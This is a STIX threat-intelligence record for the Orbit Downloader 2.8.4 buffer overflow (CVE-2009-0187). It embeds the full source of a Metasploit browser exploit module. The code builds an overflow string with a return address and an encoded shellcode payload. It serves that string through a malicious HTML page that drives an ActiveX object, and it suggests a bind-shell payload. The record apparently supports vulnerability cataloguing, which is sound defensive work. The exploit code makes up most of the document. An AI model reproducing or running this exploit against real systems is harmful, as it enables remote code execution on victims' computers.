{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8b95743c-2e7c-4371-bfee-ce10e723419f",
    "created": "2024-08-14T16:44:00.979012Z",
    "modified": "2024-08-14T16:44:00.979016Z",
    "name": "Orbit Downloader Connecting Log Creation Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Orbit Downloader 2.8.4. When an attacker serves up a malicious web site, arbitrary code may be executed. The PAYLOAD windows/shell_bind_tcp works best.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/orbit_connecting.rb",
            "external_id": "orbit_connecting.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0187"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Orbit Downloader Connecting Log Creation Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Orbit Downloader 2.8.4. When an\n        attacker serves up a malicious web site, arbitrary code may be executed.\n        The PAYLOAD windows/shell_bind_tcp works best.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-0187' ],\n          [ 'OSVDB', '52294' ],\n          [ 'BID', '33894' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 750,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\&\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder'  => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",\n          'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,\n          'DisableNops'  =>  'True',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / IE 6.0 SP0-SP2',  { 'Ret' => 0x1008dee3 } ], # download.dll 2.7.0.6\n        ],\n      'DisclosureDate' => '2009-02-03',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t  = rand_text_alpha(rand(100) + 1)\n    strname = rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    sploit = \"http://\" + rand_text_alpha(508) + [target.ret].pack('V') + p.encoded + \".com\"\n\n    # Build out the message\n    content = %Q|<html>\n<object classid='clsid:3F1D494B-0CEF-4468-96C9-386E2E4DEC90' id='#{vname}'></object>\n<script language='javascript'>\nvar #{vname} = document.getElementById('#{vname}');\nvar #{strname} = new String('#{sploit}');\n#{vname}.download(#{strname}, #{vname}, #{vname}, #{vname}, 1);\n</script>\n</html>\n|\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-02-03",
    "x_mitre_platforms": [
        "win'"
    ]
}